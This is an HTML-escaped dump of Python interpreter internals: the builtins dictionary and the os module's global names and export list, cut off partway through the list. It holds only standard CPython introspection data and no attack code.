\u0026#39;__builtins__\u0026#39;: {\u0026#39;__name__\u0026#39;: \u0026#39;builtins\u0026#39;, \u0026#39;__doc__\u0026#39;: \u0026#34;Built-in functions, exceptions, and other objects.\\n\\nNoteworthy: None is the `nil\u0026#39; object; Ellipsis represents `...\u0026#39; in slices.\u0026#34;, \u0026#39;__package__\u0026#39;: \u0026#39;\u0026#39;, \u0026#39;__loader__\u0026#39;: \u0026lt;class \u0026#39;_frozen_importlib.BuiltinImporter\u0026#39;\u0026gt;, \u0026#39;__spec__\u0026#39;: ModuleSpec(name=\u0026#39;builtins\u0026#39;, loader=\u0026lt;class \u0026#39;_frozen_importlib.BuiltinImporter\u0026#39;\u0026gt;, origin=\u0026#39;built-in\u0026#39;), \u0026#39;__build_class__\u0026#39;: \u0026lt;built-in function __build_class__\u0026gt;, \u0026#39;__import__\u0026#39;: \u0026lt;built-in function __import__\u0026gt;, \u0026#39;abs\u0026#39;: \u0026lt;built-in function abs\u0026gt;, \u0026#39;all\u0026#39;: \u0026lt;built-in function all\u0026gt;, \u0026#39;any\u0026#39;: \u0026lt;built-in function any\u0026gt;, \u0026#39;ascii\u0026#39;: \u0026lt;built-in function ascii\u0026gt;, \u0026#39;bin\u0026#39;: \u0026lt;built-in function bin\u0026gt;, \u0026#39;breakpoint\u0026#39;: \u0026lt;built-in function breakpoint\u0026gt;, \u0026#39;callable\u0026#39;: \u0026lt;built-in function callable\u0026gt;, \u0026#39;chr\u0026#39;: \u0026lt;built-in function chr\u0026gt;, \u0026#39;compile\u0026#39;: \u0026lt;built-in function compile\u0026gt;, \u0026#39;delattr\u0026#39;: \u0026lt;built-in function delattr\u0026gt;, \u0026#39;dir\u0026#39;: \u0026lt;built-in function dir\u0026gt;, \u0026#39;divmod\u0026#39;: \u0026lt;built-in function divmod\u0026gt;, \u0026#39;eval\u0026#39;: \u0026lt;built-in function eval\u0026gt;, \u0026#39;exec\u0026#39;: \u0026lt;built-in function exec\u0026gt;, \u0026#39;format\u0026#39;: \u0026lt;built-in function format\u0026gt;, \u0026#39;getattr\u0026#39;: \u0026lt;built-in function getattr\u0026gt;, \u0026#39;globals\u0026#39;: \u0026lt;built-in function globals\u0026gt;, \u0026#39;hasattr\u0026#39;: \u0026lt;built-in function hasattr\u0026gt;, \u0026#39;hash\u0026#39;: \u0026lt;built-in function hash\u0026gt;, \u0026#39;hex\u0026#39;: \u0026lt;built-in function hex\u0026gt;, \u0026#39;id\u0026#39;: \u0026lt;built-in function id\u0026gt;, \u0026#39;input\u0026#39;: \u0026lt;built-in function input\u0026gt;, \u0026#39;isinstance\u0026#39;: \u0026lt;built-in function isinstance\u0026gt;, \u0026#39;issubclass\u0026#39;: \u0026lt;built-in function issubclass\u0026gt;, \u0026#39;iter\u0026#39;: \u0026lt;built-in function iter\u0026gt;, \u0026#39;aiter\u0026#39;: \u0026lt;built-in function aiter\u0026gt;, \u0026#39;len\u0026#39;: \u0026lt;built-in function len\u0026gt;, \u0026#39;locals\u0026#39;: \u0026lt;built-in function locals\u0026gt;, \u0026#39;max\u0026#39;: \u0026lt;built-in function max\u0026gt;, \u0026#39;min\u0026#39;: \u0026lt;built-in function min\u0026gt;, \u0026#39;next\u0026#39;: \u0026lt;built-in function next\u0026gt;, \u0026#39;anext\u0026#39;: \u0026lt;built-in function anext\u0026gt;, \u0026#39;oct\u0026#39;: \u0026lt;built-in function oct\u0026gt;, \u0026#39;ord\u0026#39;: \u0026lt;built-in function ord\u0026gt;, \u0026#39;pow\u0026#39;: \u0026lt;built-in function pow\u0026gt;, \u0026#39;print\u0026#39;: \u0026lt;built-in function print\u0026gt;, \u0026#39;repr\u0026#39;: \u0026lt;built-in function repr\u0026gt;, \u0026#39;round\u0026#39;: \u0026lt;built-in function round\u0026gt;, \u0026#39;setattr\u0026#39;: \u0026lt;built-in function setattr\u0026gt;, \u0026#39;sorted\u0026#39;: \u0026lt;built-in function sorted\u0026gt;, \u0026#39;sum\u0026#39;: \u0026lt;built-in function sum\u0026gt;, \u0026#39;vars\u0026#39;: \u0026lt;built-in function vars\u0026gt;, \u0026#39;None\u0026#39;: None, \u0026#39;Ellipsis\u0026#39;: Ellipsis, \u0026#39;NotImplemented\u0026#39;: NotImplemented, \u0026#39;False\u0026#39;: False, \u0026#39;True\u0026#39;: True, \u0026#39;bool\u0026#39;: \u0026lt;class \u0026#39;bool\u0026#39;\u0026gt;, \u0026#39;memoryview\u0026#39;: \u0026lt;class \u0026#39;memoryview\u0026#39;\u0026gt;, \u0026#39;bytearray\u0026#39;: \u0026lt;class \u0026#39;bytearray\u0026#39;\u0026gt;, \u0026#39;bytes\u0026#39;: \u0026lt;class \u0026#39;bytes\u0026#39;\u0026gt;, \u0026#39;classmethod\u0026#39;: \u0026lt;class \u0026#39;classmethod\u0026#39;\u0026gt;, \u0026#39;complex\u0026#39;: \u0026lt;class \u0026#39;complex\u0026#39;\u0026gt;, \u0026#39;dict\u0026#39;: \u0026lt;class \u0026#39;dict\u0026#39;\u0026gt;, \u0026#39;enumerate\u0026#39;: \u0026lt;class \u0026#39;enumerate\u0026#39;\u0026gt;, \u0026#39;filter\u0026#39;: \u0026lt;class \u0026#39;filter\u0026#39;\u0026gt;, \u0026#39;float\u0026#39;: \u0026lt;class \u0026#39;float\u0026#39;\u0026gt;, \u0026#39;frozenset\u0026#39;: \u0026lt;class \u0026#39;frozenset\u0026#39;\u0026gt;, \u0026#39;property\u0026#39;: \u0026lt;class \u0026#39;property\u0026#39;\u0026gt;, \u0026#39;int\u0026#39;: \u0026lt;class \u0026#39;int\u0026#39;\u0026gt;, \u0026#39;list\u0026#39;: \u0026lt;class \u0026#39;list\u0026#39;\u0026gt;, \u0026#39;map\u0026#39;: \u0026lt;class \u0026#39;map\u0026#39;\u0026gt;, \u0026#39;object\u0026#39;: \u0026lt;class \u0026#39;object\u0026#39;\u0026gt;, \u0026#39;range\u0026#39;: \u0026lt;class \u0026#39;range\u0026#39;\u0026gt;, \u0026#39;reversed\u0026#39;: \u0026lt;class \u0026#39;reversed\u0026#39;\u0026gt;, \u0026#39;set\u0026#39;: \u0026lt;class \u0026#39;set\u0026#39;\u0026gt;, \u0026#39;slice\u0026#39;: \u0026lt;class \u0026#39;slice\u0026#39;\u0026gt;, \u0026#39;staticmethod\u0026#39;: \u0026lt;class \u0026#39;staticmethod\u0026#39;\u0026gt;, \u0026#39;str\u0026#39;: \u0026lt;class \u0026#39;str\u0026#39;\u0026gt;, \u0026#39;super\u0026#39;: \u0026lt;class \u0026#39;super\u0026#39;\u0026gt;, \u0026#39;tuple\u0026#39;: \u0026lt;class \u0026#39;tuple\u0026#39;\u0026gt;, \u0026#39;type\u0026#39;: \u0026lt;class \u0026#39;type\u0026#39;\u0026gt;, \u0026#39;zip\u0026#39;: \u0026lt;class \u0026#39;zip\u0026#39;\u0026gt;, \u0026#39;__debug__\u0026#39;: True, \u0026#39;BaseException\u0026#39;: \u0026lt;class \u0026#39;BaseException\u0026#39;\u0026gt;, \u0026#39;BaseExceptionGroup\u0026#39;: \u0026lt;class \u0026#39;BaseExceptionGroup\u0026#39;\u0026gt;, \u0026#39;Exception\u0026#39;: \u0026lt;class \u0026#39;Exception\u0026#39;\u0026gt;, \u0026#39;GeneratorExit\u0026#39;: \u0026lt;class \u0026#39;GeneratorExit\u0026#39;\u0026gt;, \u0026#39;KeyboardInterrupt\u0026#39;: \u0026lt;class \u0026#39;KeyboardInterrupt\u0026#39;\u0026gt;, \u0026#39;SystemExit\u0026#39;: \u0026lt;class \u0026#39;SystemExit\u0026#39;\u0026gt;, \u0026#39;ArithmeticError\u0026#39;: \u0026lt;class \u0026#39;ArithmeticError\u0026#39;\u0026gt;, \u0026#39;AssertionError\u0026#39;: \u0026lt;class \u0026#39;AssertionError\u0026#39;\u0026gt;, \u0026#39;AttributeError\u0026#39;: \u0026lt;class \u0026#39;AttributeError\u0026#39;\u0026gt;, \u0026#39;BufferError\u0026#39;: \u0026lt;class \u0026#39;BufferError\u0026#39;\u0026gt;, \u0026#39;EOFError\u0026#39;: \u0026lt;class \u0026#39;EOFError\u0026#39;\u0026gt;, \u0026#39;ImportError\u0026#39;: \u0026lt;class \u0026#39;ImportError\u0026#39;\u0026gt;, \u0026#39;LookupError\u0026#39;: \u0026lt;class \u0026#39;LookupError\u0026#39;\u0026gt;, \u0026#39;MemoryError\u0026#39;: \u0026lt;class \u0026#39;MemoryError\u0026#39;\u0026gt;, \u0026#39;NameError\u0026#39;: \u0026lt;class \u0026#39;NameError\u0026#39;\u0026gt;, \u0026#39;OSError\u0026#39;: \u0026lt;class \u0026#39;OSError\u0026#39;\u0026gt;, \u0026#39;ReferenceError\u0026#39;: \u0026lt;class \u0026#39;ReferenceError\u0026#39;\u0026gt;, \u0026#39;RuntimeError\u0026#39;: \u0026lt;class \u0026#39;RuntimeError\u0026#39;\u0026gt;, \u0026#39;StopAsyncIteration\u0026#39;: \u0026lt;class \u0026#39;StopAsyncIteration\u0026#39;\u0026gt;, \u0026#39;StopIteration\u0026#39;: \u0026lt;class \u0026#39;StopIteration\u0026#39;\u0026gt;, \u0026#39;SyntaxError\u0026#39;: \u0026lt;class \u0026#39;SyntaxError\u0026#39;\u0026gt;, \u0026#39;SystemError\u0026#39;: \u0026lt;class \u0026#39;SystemError\u0026#39;\u0026gt;, \u0026#39;TypeError\u0026#39;: \u0026lt;class \u0026#39;TypeError\u0026#39;\u0026gt;, \u0026#39;ValueError\u0026#39;: \u0026lt;class \u0026#39;ValueError\u0026#39;\u0026gt;, \u0026#39;Warning\u0026#39;: \u0026lt;class \u0026#39;Warning\u0026#39;\u0026gt;, \u0026#39;FloatingPointError\u0026#39;: \u0026lt;class \u0026#39;FloatingPointError\u0026#39;\u0026gt;, \u0026#39;OverflowError\u0026#39;: \u0026lt;class \u0026#39;OverflowError\u0026#39;\u0026gt;, \u0026#39;ZeroDivisionError\u0026#39;: \u0026lt;class \u0026#39;ZeroDivisionError\u0026#39;\u0026gt;, \u0026#39;BytesWarning\u0026#39;: \u0026lt;class \u0026#39;BytesWarning\u0026#39;\u0026gt;, \u0026#39;DeprecationWarning\u0026#39;: \u0026lt;class \u0026#39;DeprecationWarning\u0026#39;\u0026gt;, \u0026#39;EncodingWarning\u0026#39;: \u0026lt;class \u0026#39;EncodingWarning\u0026#39;\u0026gt;, \u0026#39;FutureWarning\u0026#39;: \u0026lt;class \u0026#39;FutureWarning\u0026#39;\u0026gt;, \u0026#39;ImportWarning\u0026#39;: \u0026lt;class \u0026#39;ImportWarning\u0026#39;\u0026gt;, \u0026#39;PendingDeprecationWarning\u0026#39;: \u0026lt;class \u0026#39;PendingDeprecationWarning\u0026#39;\u0026gt;, \u0026#39;ResourceWarning\u0026#39;: \u0026lt;class \u0026#39;ResourceWarning\u0026#39;\u0026gt;, \u0026#39;RuntimeWarning\u0026#39;: \u0026lt;class \u0026#39;RuntimeWarning\u0026#39;\u0026gt;, \u0026#39;SyntaxWarning\u0026#39;: \u0026lt;class \u0026#39;SyntaxWarning\u0026#39;\u0026gt;, \u0026#39;UnicodeWarning\u0026#39;: \u0026lt;class \u0026#39;UnicodeWarning\u0026#39;\u0026gt;, \u0026#39;UserWarning\u0026#39;: \u0026lt;class \u0026#39;UserWarning\u0026#39;\u0026gt;, \u0026#39;BlockingIOError\u0026#39;: \u0026lt;class \u0026#39;BlockingIOError\u0026#39;\u0026gt;, \u0026#39;ChildProcessError\u0026#39;: \u0026lt;class \u0026#39;ChildProcessError\u0026#39;\u0026gt;, \u0026#39;ConnectionError\u0026#39;: \u0026lt;class \u0026#39;ConnectionError\u0026#39;\u0026gt;, \u0026#39;FileExistsError\u0026#39;: \u0026lt;class \u0026#39;FileExistsError\u0026#39;\u0026gt;, \u0026#39;FileNotFoundError\u0026#39;: \u0026lt;class \u0026#39;FileNotFoundError\u0026#39;\u0026gt;, \u0026#39;InterruptedError\u0026#39;: \u0026lt;class \u0026#39;InterruptedError\u0026#39;\u0026gt;, \u0026#39;IsADirectoryError\u0026#39;: \u0026lt;class \u0026#39;IsADirectoryError\u0026#39;\u0026gt;, \u0026#39;NotADirectoryError\u0026#39;: \u0026lt;class \u0026#39;NotADirectoryError\u0026#39;\u0026gt;, \u0026#39;PermissionError\u0026#39;: \u0026lt;class \u0026#39;PermissionError\u0026#39;\u0026gt;, \u0026#39;ProcessLookupError\u0026#39;: \u0026lt;class \u0026#39;ProcessLookupError\u0026#39;\u0026gt;, \u0026#39;TimeoutError\u0026#39;: \u0026lt;class \u0026#39;TimeoutError\u0026#39;\u0026gt;, \u0026#39;IndentationError\u0026#39;: \u0026lt;class \u0026#39;IndentationError\u0026#39;\u0026gt;, \u0026#39;IndexError\u0026#39;: \u0026lt;class \u0026#39;IndexError\u0026#39;\u0026gt;, \u0026#39;KeyError\u0026#39;: \u0026lt;class \u0026#39;KeyError\u0026#39;\u0026gt;, \u0026#39;ModuleNotFoundError\u0026#39;: \u0026lt;class \u0026#39;ModuleNotFoundError\u0026#39;\u0026gt;, \u0026#39;NotImplementedError\u0026#39;: \u0026lt;class \u0026#39;NotImplementedError\u0026#39;\u0026gt;, \u0026#39;RecursionError\u0026#39;: \u0026lt;class \u0026#39;RecursionError\u0026#39;\u0026gt;, \u0026#39;UnboundLocalError\u0026#39;: \u0026lt;class \u0026#39;UnboundLocalError\u0026#39;\u0026gt;, \u0026#39;UnicodeError\u0026#39;: \u0026lt;class \u0026#39;UnicodeError\u0026#39;\u0026gt;, \u0026#39;BrokenPipeError\u0026#39;: \u0026lt;class \u0026#39;BrokenPipeError\u0026#39;\u0026gt;, \u0026#39;ConnectionAbortedError\u0026#39;: \u0026lt;class \u0026#39;ConnectionAbortedError\u0026#39;\u0026gt;, \u0026#39;ConnectionRefusedError\u0026#39;: \u0026lt;class \u0026#39;ConnectionRefusedError\u0026#39;\u0026gt;, \u0026#39;ConnectionResetError\u0026#39;: \u0026lt;class \u0026#39;ConnectionResetError\u0026#39;\u0026gt;, \u0026#39;TabError\u0026#39;: \u0026lt;class \u0026#39;TabError\u0026#39;\u0026gt;, \u0026#39;UnicodeDecodeError\u0026#39;: \u0026lt;class \u0026#39;UnicodeDecodeError\u0026#39;\u0026gt;, \u0026#39;UnicodeEncodeError\u0026#39;: \u0026lt;class \u0026#39;UnicodeEncodeError\u0026#39;\u0026gt;, \u0026#39;UnicodeTranslateError\u0026#39;: \u0026lt;class \u0026#39;UnicodeTranslateError\u0026#39;\u0026gt;, \u0026#39;ExceptionGroup\u0026#39;: \u0026lt;class \u0026#39;ExceptionGroup\u0026#39;\u0026gt;, \u0026#39;EnvironmentError\u0026#39;: \u0026lt;class \u0026#39;OSError\u0026#39;\u0026gt;, \u0026#39;IOError\u0026#39;: \u0026lt;class \u0026#39;OSError\u0026#39;\u0026gt;, \u0026#39;open\u0026#39;: \u0026lt;built-in function open\u0026gt;, \u0026#39;quit\u0026#39;: Use quit() or Ctrl-D (i.e. EOF) to exit, \u0026#39;exit\u0026#39;: Use exit() or Ctrl-D (i.e. EOF) to exit, \u0026#39;copyright\u0026#39;: Copyright (c) 2001-2022 Python Software Foundation. All Rights Reserved. Copyright (c) 2000 BeOpen.com. All Rights Reserved. Copyright (c) 1995-2001 Corporation for National Research Initiatives. All Rights Reserved. Copyright (c) 1991-1995 Stichting Mathematisch Centrum, Amsterdam. All Rights Reserved., \u0026#39;credits\u0026#39;: Thanks to CWI, CNRI, BeOpen.com, Zope Corporation and a cast of thousands for supporting Python development. See www.python.org for more information., \u0026#39;license\u0026#39;: Type license() to see the full license text, \u0026#39;help\u0026#39;: Type help() for interactive help, or help(object) for help about object.}, \u0026#39;abc\u0026#39;: \u0026lt;module \u0026#39;abc\u0026#39; (frozen)\u0026gt;, \u0026#39;sys\u0026#39;: \u0026lt;module \u0026#39;sys\u0026#39; (built-in)\u0026gt;, \u0026#39;st\u0026#39;: \u0026lt;module \u0026#39;stat\u0026#39; (frozen)\u0026gt;, \u0026#39;_check_methods\u0026#39;: \u0026lt;function _check_methods at 0x7fceecd1f100\u0026gt;, \u0026#39;GenericAlias\u0026#39;: \u0026lt;class \u0026#39;types.GenericAlias\u0026#39;\u0026gt;, \u0026#39;__all__\u0026#39;: [\u0026#39;altsep\u0026#39;, \u0026#39;curdir\u0026#39;, \u0026#39;pardir\u0026#39;, \u0026#39;sep\u0026#39;, \u0026#39;pathsep\u0026#39;, \u0026#39;linesep\u0026#39;, \u0026#39;defpath\u0026#39;, \u0026#39;name\u0026#39;, \u0026#39;path\u0026#39;, \u0026#39;devnull\u0026#39;, \u0026#39;SEEK_SET\u0026#39;, \u0026#39;SEEK_CUR\u0026#39;, \u0026#39;SEEK_END\u0026#39;, \u0026#39;fsencode\u0026#39;, \u0026#39;fsdecode\u0026#39;, \u0026#39;get_exec_path\u0026#39;, \u0026#39;fdopen\u0026#39;, \u0026#39;extsep\u0026#39;, \u0026#39;_exit\u0026#39;, \u0026#39;CLD_CONTINUED\u0026#39;, \u0026#39;CLD_DUMPED\u0026#39;, \u0026#39;CLD_EXITED\u0026#39;, \u0026#39;CLD_KILLED\u0026#39;, \u0026#39;CLD_STOPPED\u0026#39;, \u0026#39;CLD_TRAPPED\u0026#39;, \u0026#39;DirEntry\u0026#39;, \u0026#39;EFD_CLOEXEC\u0026#39;, \u0026#39;EFD_NONBLOCK\u0026#39;, \u0026#39;EFD_SEMAPHORE\u0026#39;, \u0026#39;EX_CANTCREAT\u0026#39;, \u0026#39;EX_CONFIG\u0026#39;, \u0026#39;EX_DATAERR\u0026#39;, \u0026#39;EX_IOERR\u0026#39;, \u0026#39;EX_NOHOST\u0026#39;, \u0026#39;EX_NOINPUT\u0026#39;, \u0026#39;EX_NOPERM\u0026#39;, \u0026#39;EX_NOUSER\u0026#39;, \u0026#39;EX_OK\u0026#39;, \u0026#39;EX_OSERR\u0026#39;, \u0026#39;EX_OSFILE\u0026#39;, \u0026#39;EX_PROTOCOL\u0026#39;, \u0026#39;EX_SOFTWARE\u0026#39;, \u0026#39;EX_TEMPFAIL\u0026#39;, \u0026#39;EX_UNAVAILABLE\u0026#39;, \u0026#39;EX_USAGE\u0026#39;, \u0026#39;F_LOCK\u0026#39;, \u0026#39;F_OK\u0026#39;, \u0026#39;F_TEST\u0026#39;, \u0026#39;F_TLOCK\u0026#39;, \u0026#39;F_ULOCK\u0026#39;, \u0026#39;GRND_NONBLOCK\u0026#39;, \u0026#39;GRND_RANDOM\u0026#39;, \u0026#39;MFD_ALLOW_SEALING\u0026#39;, \u0026#39;MFD_CLOEXEC\u0026#39;, \u0026#39;MFD_HUGETLB\u0026#39;, \u0026#39;MFD_HUGE_16GB\u0026#39;, \u0026#39;MFD_HUGE_16MB\u0026#39;, \u0026#39;MFD_HUGE_1GB\u0026#39;, \u0026#39;MFD_HUGE_1MB\u0026#39;, \u0026#39;MFD_HUGE_256MB\u0026#39;, \u0026#39;MFD_HUGE_2GB\u0026#39;, \u0026#39;MFD_HUGE_2MB\u0026#39;, \u0026#39;MFD_HUGE_32MB\u0026#39;, \u0026#39;MFD_HUGE_512KB\u0026#39;, \u0026#39;MFD_HUGE_512MB\u0026#39;, \u0026#39;MFD_HUGE_64KB\u0026#39;, \u0026#39;MFD_HUGE_8MB\u0026#39;, \u0026#39;MFD_HUGE_MASK\u0026#39;, \u0026#39;MFD_HUGE_SHIFT\u0026#39;, \u0026#39;NGROUPS_MAX\u0026#39;, \u0026#39;O_ACCMODE\u0026#39;, \u0026#39;O_APPEND\u0026#39;, \u0026#39;O_ASYNC\u0026#39;, \u0026#39;O_CLOEXEC\u0026#39;, \u0026#39;O_CREAT\u0026#39;, \u0026#39;O_DIRECT\u0026#39;, \u0026#39;O_DIRECTORY\u0026#39;, \u0026#39;O_DSYNC\u0026#39;, \u0026#39;O_EXCL\u0026#39;, \u0026#39;O_FSYNC\u0026#39;, \u0026#39;O_LARGEFILE\u0026#39;, \u0026#39;O_NDELAY\u0026#39;, \u0026#39;O_NOATIME\u0026#39;, \u0026#39;O_NOCTTY\u0026#39;, \u0026#39;O_NOFOLLOW\u0026#39;, \u0026#39;O_NONBLOCK\u0026#39;, \u0026#39;O_PATH\u0026#39;, \u0026#39;O_RDONLY\u0026#39;, \u0026#39;O_RDWR\u0026#39;, \u0026#39;O_RSYNC\u0026#39;, \u0026#39;O_SYNC\u0026#39;, \u0026#39;O_TMPFILE\u0026#39;, \u0026#39;O_TRUNC\u0026#39;, \u0026#39;O_WRONLY\u0026#39;, \u0026#39;POSIX_FADV_DONTNEED\u0026#39;, \u0026#39;POSIX_FADV_NOREUSE\u0026#39;, \u0026#39;POSIX_FADV_NORMAL\u0026#39;, \u0026#39;POSIX_FADV_RANDOM\u0026#39;, \u0026#39;POSIX_FADV_SEQUENTIAL\u0026#39;, \u0026#39;POSIX_FADV_WILLNEED\u0026#39;, \u0026#39;POSIX_SPAWN_CLOSE\u0026#39;, \u0026#39;POSIX_SPAWN_DUP2\u0026#39;, \u0026#39;POSIX_SPAWN_OPEN\u0026#39;, \u0026#39;PRIO_PGRP\u0026#39;, \u0026#39;PRIO_PROCESS\u0026#39;, \u0026#39;PRIO_USER\u0026#39;, \u0026#39;P_ALL\u0026#39;, \u0026#39;P_PGID\u0026#39;, \u0026#39;P_PID\u0026#39;, \u0026#39;P_PIDFD\u0026#39;, \u0026#39;RTLD_DEEPBIND\u0026#39;, \u0026#39;RTLD_GLOBAL\u0026#39;, \u0026#39;RTLD_LAZY\u0026#39;, \u0026#39;RTLD_LOCAL\u0026#39;, \u0026#39;RTLD_NODELETE\u0026#39;, \u0026#39;RTLD_NOLOAD\u0026#39;, \u0026#39;RTLD_NOW\u0026#39;, \u0026#39;RWF_APPEND\u0026#39;, \u0026#39;RWF_DSYNC\u0026#39;, \u0026#39;RWF_HIPRI\u0026#39;, \u0026#39;RWF_NOWAIT\u0026#39;, \u0026#39;RWF_SYNC\u0026#39;, \u0026#39;R_OK\u0026#39;, \u0026#39;SCHED_BATCH\u0026#39;, \u0026#39;SCHED_FIFO\u0026#39;, \u0026#39;SCHED_IDLE\u0026#39;, \u0026#39;SCHED_OTHER\u0026#39;, \u0026#39;SCHED_RESET_ON_FORK\u0026#39;, \u0026#39;SCHED_RR\u0026#39;, \u0026#39;SEEK_DATA\u0026#39;, \u0026#39;SEEK_HOLE\u0026#39;, \u0026#39;SPLICE_F_MORE\u0026#39;, \u0026#39;SPLICE_F_MOVE\u0026#39;, \u0026#39;SPLICE_F_NONBLOCK\u0026#39;, \u0026#39;ST_APPEND\u0026#39;, \u0026#39;ST_MANDLOCK\u0026#39;, \u0026#39;ST_NOATIME\u0026#39;, \u0026#39;ST_NODEV\u0026#39;, \u0026#39;ST_NODIRATIME\u0026#39;, \u0026#39;ST_NOEXEC\u0026#39;, \u0026#39;ST_NOSUID\u0026#39;, \u0026#39;ST_RDONLY\u0026#39;, \u0026#39;ST_RELATIME\u0026#39;, \u0026#39;ST_SYNCHRONOUS\u0026#39;, \u0026#39;ST_WRITE\u0026#39;, \u0026#39;TMP_MAX\u0026#39;, \u0026#39;WCONTINUED\u0026#39;, \u0026#39;WCOREDUMP\u0026#39;, \u0026#39;WEXITED\u0026#39;, \u0026#39;WEXITSTATUS\u0026#39;, \u0026#39;WIFCONTINUED\u0026#39;, \u0026#39;WIFEXITED\u0026#39;, \u0026#39;WIFSIGNALED\u0026#39;, \u0026#39;WIFSTOPPED\u0026#39;, \u0026#39;WNOHANG\u0026#39;, \u0026#39;WNOWAIT\u0026#39;, \u0026#39;WSTOPPED\u0026#39;, \u0026#39;WSTOPSIG\u0026#39;, \u0026#39;WTERMSIG\u0026#39;, \u0026#39;WUNTRACED\u0026#39;, \u0026#39;W_OK\u0026#39;, \u0026#39;XATTR_CREATE\u0026#39;, \u0026#39;XATTR_REPLACE\u0026#39;, \u0026#39;XATTR_SIZE_MAX\u0026#39;, \u0026#39;X_OK\u0026#39;, \u0026#39;abort\u0026#39;, \u0026#39;access\u0026#39;, \u0026#39;chdir\u0026#39;, \u0026#39;chmod\u0026#39;, \u0026#39;chown\u0026#39;, \u0026#39;chroot\u0026#39;, \u0026#39;close\u0026#39;, \u0026#39;closerange\u0026#39;, \u0026#39;confstr\u0026#39;, \u0026#39;confstr_names\u0026#39;, \u0026#39;copy_file_range\u0026#39;, \u0026#39;cpu_count\u0026#39;, \u0026#39;ctermid\u0026#39;, \u0026#39;device_encoding\u0026#39;, \u0026#39;dup\u0026#39;, \u0026#39;dup2\u0026#39;, \u0026#39;environ\u0026#39;, \u0026#39;error\u0026#39;, \u0026#39;eventfd\u0026#39;, \u0026#39;eventfd_read\u0026#39;, \u0026#39;eventfd_write\u0026#39;, \u0026#39;execv\u0026#39;, \u0026#39;execve\u0026#39;, \u0026#39;fchdir\u0026#39;, \u0026#39;fchmod\u0026#39;, \u0026#39;fchown\u0026#39;, \u0026#39;fdatasync\u0026#39;, \u0026#39;fork\u0026#39;, \u0026#39;forkpty\u0026#39;, \u0026#39;fpathconf\u0026#39;, \u0026#39;fspath\u0026#39;, \u0026#39;fstat\u0026#39;, \u0026#39;fstatvfs\u0026#39;, \u0026#39;fsync\u0026#39;, \u0026#39;ftruncate\u0026#39;, \u0026#39;get_blocking\u0026#39;, \u0026#39;get_inheritable\u0026#39;, \u0026#39;get_terminal_size\u0026#39;, \u0026#39;getcwd\u0026#39;, \u0026#39;getcwdb\u0026#39;, \u0026#39;getegid\u0026#39;, \u0026#39;geteuid\u0026#39;, \u0026#39;getgid\u0026#39;, \u0026#39;getgrouplist\u0026#39;, \u0026#39;getgroups\u0026#39;, \u0026#39;getloadavg\u0026#39;, \u0026#39;getlogin\u0026#39;, \u0026#39;getpgid\u0026#39;, \u0026#39;getpgrp\u0026#39;, \u0026#39;getpid\u0026#39;, \u0026#39;getppid\u0026#39;, \u0026#39;getpriority\u0026#39;, \u0026#39;getrandom\u0026#39;, \u0026#39;getresgid\u0026#39;, \u0026#39;getresuid\u0026#39;, \u0026#39;getsid\u0026#39;, \u0026#39;getuid\u0026#39;, \u0026#39;getxattr\u0026#39;, \u0026#39;initgroups\u0026#39;, \u0026#39;isatty\u0026#39;, \u0026#39;kill\u0026#39;, \u0026#39;killpg\u0026#39;, \u0026#39;lchown\u0026#39;, \u0026#39;link\u0026#39;, \u0026#39;listdir\u0026#39;, \u0026#39;listxattr\u0026#39;, \u0026#39;lockf\u0026#39;, \u0026#39;login_tty\u0026#39;, \u0026#39;lseek\u0026#39;, \u0026#39;lstat\u0026#39;, \u0026#39;major\u0026#39;, \u0026#39;makedev\u0026#39;, \u0026#39;memfd_create\u0026#39;, \u0026#39;minor\u0026#39;, \u0026#39;mkdir\u0026#39;, \u0026#39;mkfifo\u0026#39;, \u0026#39;mknod\u0026#39;, \u0026#39;nice\u0026#39;, \u0026#39;open\u0026#39;, \u0026#39;openpty\u0026#39;, \u0026#39;pathconf\u0026#39;, \u0026#39;pathconf_names\u0026#39;, \u0026#39;pidfd_open\u0026#39;, \u0026#39;pipe\u0026#39;, \u0026#39;pipe2\u0026#39;, \u0026#39;posix_fadvise\u0026#39;, \u0026#39;posix_fallocate\u0026#39;, \u0026#39;posix_spawn\u0026#39;, \u0026#39;posix_spawnp\u0026#39;, \u0026#39;pread\u0026#39;, \u0026#39;preadv\u0026#39;, \u0026#39;putenv\u0026#39;, \u0026#39;pwrite\u0026#39;, \u0026#39;pwritev\u0026#39;, \u0026#39;read\u0026#39;, \u0026#39;readlink\u0026#39;, \u0026#39;readv\u0026#39;, \u0026#39;register_at_fork\u0026#39;, \u0026#39;remove\u0026#39;, \u0026#39;removexattr\u0026#39;, \u0026#39;rename\u0026#39;, \u0026#39;replace\u0026#39;, \u0026#39;rmdir\u0026#39;, \u0026#39;scandir\u0026#39;, \u0026#39;sched_get_priority_max\u0026#39;, \u0026#39;sched_get_priority_min\u0026#39;, \u0026#39;sched_getaffinity\u0026#39;, \u0026#39;sched_getparam\u0026#39;, \u0026#39;sched_getscheduler\u0026#39;, \u0026#39;sched_param\u0026#39;, \u0026#39;sched_rr_get_interval\u0026#39;, \u0026#39;sched_setaffinity\u0026#39;, \u0026#39;sched_setparam\u0026#39;, \u0026#39;sched_setscheduler\u0026#39;, \u0026#39;sched_yield\u0026#39;, \u0026#39;sendfile\u0026#39;, \u0026#39;set_blocking\u0026#39;, \u0026#39;set_inheritable\u0026#39;, \u0026#39;setegid\u0026#39;, \u0026#39;seteuid\u0026#39;, \u0026#39;setgid\u0026#39;, \u0026#39;setgroups\u0026#39;, \u0026#39;setpgid\u0026#39;, \u0026#39;setpgrp\u0026#39;, \u0026#39;setpriority\u0026#39;, \u0026#39;setregid\u0026#39;, \u0026#39;setresgid\u0026#39;, \u0026#39;setresuid\u0026#39;, \u0026#39;setreuid\u0026#39;, \u0026#39;setsid\u0026#39;, \u0026#39;setuid\u0026#39;, \u0026#39;setxattr\u0026#39;, \u0026#39;splice\u0026#39;, \u0026#39;stat\u0026#39;, \u0026#39;stat_result\u0026#39;, \u0026#39;statvfs\u0026#39;, \u0026#39;statvfs_result\u0026#39;, \u0026#39;strerror\u0026#39;, \u0026#39;symlink\u0026#39;, \u0026#39;sync\u0026#39;, \u0026#39;sysconf\u0026#39;, \u0026#39;sysconf_names\u0026#39;, \u0026#39;system\u0026#39;, \u0026#39;tcgetpgrp\u0026#39;, \u0026#39;tcsetpgrp\u0026#39;, \u0026#39;terminal_size\u0026#39;, \u0026#39;times\u0026#39;, \u0026#39;times_result\u0026#39;, \u0026#39;truncate\u0026#39;, \u0026#39;ttyname\u0026#39;, \u0026#39;umask\u0026#39;, \u0026#39;uname\u0026#39;, \u0026#39;uname_result\u0026#39;, \u0026#39;unlink\u0026#39;, \u0026#39;unsetenv\u0026#39;, 